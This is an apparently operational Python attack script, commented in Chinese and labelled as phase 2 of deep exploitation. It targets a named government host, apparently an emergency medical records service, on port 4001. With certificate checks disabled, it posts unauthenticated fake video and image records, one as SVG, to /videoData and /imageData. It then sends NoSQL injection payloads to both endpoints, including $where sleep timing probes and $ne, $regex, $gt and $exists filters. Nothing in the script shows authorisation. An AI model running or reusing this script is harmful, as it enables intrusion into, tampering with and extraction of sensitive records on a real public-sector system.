#!/usr/bin/env python3
"""Phase 2: :4001 写操作 / SSRF / NoSQL 注入深度利用"""
import http.client, json, ssl, urllib.parse, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=15):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

host = 'epcr.tpf.gov.tw'
def H(c='', j=False):
    h = {'Content-Type': c} if c else {}
    if j: h['Content-Type'] = 'application/json'
    return h

print("="*80)
print("Phase 2-A :4001 /videoData POST 写入（带 fileName / fileData）")
print("="*80)

# POST /videoData 带合法字段
payloads = [
    ('json-full', 'application/json', json.dumps({
        "fileName": "[iPhone][phase2-poc]9C372D5A-POC-VIDEO",
        "fileData": "BASE64-PLACEHOLDER-V0",
        "mimeType": "video/mp4",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "VideoType": 1,
        "recordUuid": "phase2-poc-record-001"
    })),
    ('form', 'application/x-www-form-urlencoded', urllib.parse.urlencode({
        "fileName": "[iPhone][phase2-poc]form",
        "fileData": "B64FORM",
        "mimeType": "video/mp4",
        "VideoType": "1"
    })),
]

for name, ct, body in payloads:
    print(f"\n## {name} ##")
    s, b, _ = req(host, 4001, 'POST', '/videoData', body=body, headers={'Content-Type': ct})
    print(f"  status={s}  body[:300]={b[:300]!r}")

print()
print("="*80)
print("Phase 2-B :4001 /imageData POST 写入（带 fileData）")
print("="*80)
payloads_img = [
    ('json', 'application/json', json.dumps({
        "fileName": "phase2-poc-ecg",
        "fileData": "iVBORw0KGgo+PHR0ZXh0PjEzPC90ZXh0Pg==",
        "mimeType": "image/svg+xml",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "ImageType": 1,
        "recordUuid": "phase2-poc-record-img-001"
    })),
    ('form', 'application/x-www-form-urlencoded', urllib.parse.urlencode({
        "fileName": "phase2-poc-wave",
        "fileData": "iVBORw0KGgo+PHR0ZXh0PjEzPC90ZXh0Pg==",
        "mimeType": "image/jpeg",
        "ImageType": "2"
    })),
]

for name, ct, body in payloads_img:
    print(f"\n## {name} ##")
    s, b, _ = req(host, 4001, 'POST', '/imageData', body=body, headers={'Content-Type': ct})
    print(f"  status={s}  body[:300]={b[:300]!r}")

print()
print("="*80)
print("Phase 2-C :4001 /videoData NoSQL 注入（顶层 $where）")
print("="*80)
nosql_payloads = [
    ('$where', 'application/json', '{"fileName":{"$where":"this.fileName && sleep(5000)"},"VideoType":1}'),
    ('$ne', 'application/json', '{"recordUuid":{"$ne":"none"},"VideoType":1}'),
    ('$regex', 'application/json', '{"fileName":{"$regex":"^\\["}}'),
    ('$gt', 'application/json', '{"id":{"$gt":100000}}'),
    ('$exists', 'application/json', '{"recordUuid":{"$exists":true}}'),
]
for name, ct, body in nosql_payloads:
    print(f"\n## {name} ##")
    s, b, _ = req(host, 4001, 'POST', '/videoData', body=body, headers={'Content-Type': ct})
    print(f"  status={s}  body[:400]={b[:400]!r}")

print()
print("="*80)
print("Phase 2-D :4001 /imageData NoSQL 注入")
print("="*80)
nosql_img = [
    ('$where', 'application/json', '{"fileName":{"$where":"sleep(3000) || true"}}'),
    ('$ne', 'application/json', '{"recordUuid":{"$ne":"none"}}'),
    ('$regex', 'application/json', '{"fileName":{"$regex":"^a"}}'),
]
for name, ct, body in nosql_img:
    print(f"\n## {name} ##")
    s, b, _ = req(host, 4001, 'POST', '/imageData', body=body, headers={'Content-Type': ct})
    print(f"  status={s}  body[:400]={b[:400]!r}")

